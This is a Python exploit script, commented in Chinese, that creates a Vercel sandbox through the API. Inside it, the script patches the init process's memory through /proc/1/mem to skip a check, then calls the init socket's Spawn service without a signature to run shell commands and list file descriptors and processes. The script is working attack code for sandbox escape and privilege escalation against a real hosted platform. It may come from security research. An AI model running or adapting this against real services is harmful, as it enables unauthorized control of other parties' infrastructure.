# -*- coding: utf-8 -*-
"""实验J282c: 完整流程 - Spawn 子进程 fd 继承检测 (cat 明文输出)"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
        except Exception:
            print(line[:400], flush=True)
    return out

NAME = "expj282c"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A: patch
CODE_A = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x77ba00, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("4c8d6424a8"):
    wa(0x77ba00, bytes.fromhex("31c031dbc3"))
    print("PATCHED", ra(0x77ba00, 5).hex(), flush=True)
else:
    print("PATTERN_DIFF", old.hex(), flush=True)
os.close(fd)
'''
rA = run_cmd(sid, CODE_A, "A_PATCH")
print("PATCHED:", "PATCHED" in (rA or ""), flush=True)

# B: bg 免签 Spawn, 输出 fd 到文件 (base64 解码后明文)
BG = r'''
import socket, struct, json as _j, base64, re
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.settimeout(12)
sock.connect("/run/vercel/share/init.sock")
msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c",
    "echo ===P1FD===; ls -la /proc/1/fd; echo ===SELFFD===; ls -la /proc/self/fd; echo ===SOCKETFS===; ls -la /proc/self/fd | grep socket; echo ===PS===; ps -eo pid,ppid,cmd | grep -v grep; echo ===DONE==="],
    "environment": []}).encode()
body = b"\x00" + struct.pack(">I", len(msg)) + msg
req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\n"
       b"Host: init\r\nContent-Type: application/connect+json\r\n"
       b"Connect-Protocol-Version: 1\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\n"
       b"Connection: close\r\n\r\n" + body)
sock.sendall(req)
data = b""
try:
    while True:
        d = sock.recv(4096)
        if not d:
            break
        data += d
        if len(data) > 80000:
            break
except socket.timeout:
    pass
sock.close()
lines = []
for m in re.finditer(rb'"stdout":"([^"]+)"', data):
    try:
        lines.append(base64.b64decode(m.group(1)).decode("latin1", "replace"))
    except Exception:
        pass
open("/tmp/lsfd.txt", "w").write("".join(lines))
'''
CODE_B = r'''
import subprocess
open("/tmp/lsfd.py", "w").write(%r)
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/lsfd.py"],
    stdout=open("/tmp/lsfd.log", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("bg pid", r.pid, flush=True)
''' % BG
run_cmd(sid, CODE_B, "B_BG")
time.sleep(12)
out = run_cmd(sid, r'''
import os
print(open("/tmp/lsfd.txt").read() if os.path.exists("/tmp/lsfd.txt") else "MISSING", flush=True)
''', "C_GET")
print("\n=====LSFD=====", flush=True)
print(out[:6000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
